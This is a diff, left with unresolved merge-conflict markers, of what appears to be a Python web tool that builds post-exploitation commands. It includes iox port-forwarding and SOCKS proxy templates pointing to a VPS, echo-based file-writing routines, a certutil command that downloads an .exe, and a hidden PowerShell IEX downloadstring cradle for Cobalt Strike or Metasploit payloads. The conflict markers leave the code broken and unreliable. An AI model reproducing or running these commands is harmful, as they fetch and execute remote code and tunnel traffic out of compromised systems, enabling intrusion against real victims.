@@ -29,7 +29,13 @@ key_list = [';', ':', " ", "\t"]
 iox_payload = """
 [FWD模式]: 
     *端口转发至本地: ./iox fwd -l {lport} -l {rport}
+<<<<<<< HEAD
     *端口转发至VPS: ./iox fwd -l {lport} -r {vps_ip}:{vport}
+=======
+    *端口转发至VPS: 
+        (localhost)     ./iox fwd -l {lport} -r {vps_ip}:{vport}
+        (vps)             ./iox fwd -l {vps_ip}:{vport} -r {vps_ip}:2333 
+>>>>>>> master
 [PROXY模式]:
     *本地开启Sock5服务: ./iox proxy -l {rport}
     *Sock5服务转发至VPS:
@@ -53,8 +59,13 @@ class CMD():
         self.lport = request.POST["lport"] if request.POST["lport"] else "3389"
         self.rport = request.POST["rport"] if request.POST["rport"] else "12345"
         self.vport = request.POST["vport"] if request.POST["vport"] else "12345"
+<<<<<<< HEAD
         self.cs_exe = request.POST["vport"] if request.POST["vport"] else cs_exe
         self.msf_exe = request.POST["vport"] if request.POST["vport"] else msf_exe
+=======
+        self.cs_exe = request.POST["cs"] if request.POST["cs"] else cs_exe
+        self.msf_exe = request.POST["msf"] if request.POST["msf"] else msf_exe
+>>>>>>> master
         self.cs_powshell = cs_powershell
         self.msf_powshell = msf_powershell
         self.length = 25
@@ -65,8 +76,14 @@ class CMD():
             all_content = self.content
             for i in range(0, floor(len(all_content) / self.length) + 1):
                 content = all_content[self.length * i:self.length * (i + 1)]
+<<<<<<< HEAD
                 cmd1 = f"echo {content} >> {self.file}"
                 cmd_list.append(cmd1)
+=======
+                if content:
+                    cmd1 = f"echo {content} >> {self.file}"
+                    cmd_list.append(cmd1)
+>>>>>>> master
             return cmd_list
 
         def windows_cmd_1():  # base64加密Windows写文件
@@ -135,7 +152,11 @@ class CMD():
     def payload_cmd(self):
         def windows_cmd_0(url):
             filename = str(random.randint(1, 999)) + ".exe"
+<<<<<<< HEAD
             return [f"certutil.exe -urlcache -split {url} -f {filename} ", "cs.exe"]
+=======
+            return [f"certutil.exe -urlcache -split {url} -f {filename} ", filename]
+>>>>>>> master
         def windows_cmd_1(url):
             return f'''
             powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('{url}'))"
